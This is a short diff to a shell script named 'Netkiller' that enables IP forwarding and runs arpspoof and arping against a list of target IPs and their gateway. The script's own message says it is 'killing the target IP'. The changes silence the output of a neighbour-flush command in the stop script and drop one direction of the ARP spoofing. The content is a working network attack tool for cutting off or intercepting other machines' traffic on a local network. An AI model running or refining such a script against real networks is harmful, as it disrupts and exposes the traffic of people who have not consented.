@@ -74,7 +74,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 cat > /bin/netkiller-stop << EOF
 #!/bin/sh
 
-sudo ip -s -s neigh flush all
+sudo ip -s -s neigh flush all > /dev/null 2>&1
 sudo pkill -f arping
 sudo pkill -f arpspoof
 echo "Netkiller is stopped!"
@@ -149,7 +149,6 @@ for TARGET in $TARGET_IPS; do
     (
         # Bidirectional ARP Spoofing
         arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-        arpspoof -i "$INTERFACE" -t "$GATEWAY" -r "$TARGET" >/dev/null 2>&1 &
         arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
     ) &
     echo "Netkiller killing the target IP: $TARGET"
